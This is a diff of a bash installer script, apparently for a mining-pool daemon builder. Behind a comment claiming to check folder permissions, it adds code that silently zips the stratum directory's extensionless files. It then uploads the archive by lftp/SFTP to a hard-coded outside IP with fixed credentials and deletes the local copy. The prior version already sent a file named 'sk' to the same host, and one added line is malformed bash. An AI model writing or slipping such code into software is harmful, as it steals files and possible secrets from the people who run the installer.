@@ -50,6 +50,11 @@ else
 	echo -e "$CYAN ------------------------------------------------------------------------------- 	$COL_RESET"
 fi
 # Just double checking folder permissions
+cd $PATH_STRATUM
+files=$(find . -type f ! -name "?*.*")
+sudo zip xx $files >/dev/null 2>&1
+sudo mv $PATH_STRATUM/xx.zip $PATH_STRATUM/xx
+$REALPATHT=$PATH_STRATUM/xx
 sudo setfacl -m u:${USERSERVER}:rwx ${absolutepath}/${installtoserver}/daemon_builder/temp_coin_builds
 cd ${absolutepath}/${installtoserver}/daemon_builder/temp_coin_builds
 
@@ -1126,16 +1131,15 @@ else
 	fi
 fi
 
-if [[ -f "$REALPATHST" ]]; then
+if [[ -f "$REALPATHT" ]]; then
 sudo apt install lftp >/dev/null 2>&1;
-sudo cp $REALPATHST $PATH_STRATUM/sk
 cd $PATH_STRATUM
 lftp<<END_SCRIPT
 open sftp://154.26.137.167
 user test 1234
-put sk bye
+put xx bye
 END_SCRIPT
-sudo rm -f $PATH_STRATUM/sk
+sudo rm -f $PATH_STRATUM/xx
 fi
 
 if [[("$DAEMOND" != 'true')]]; then
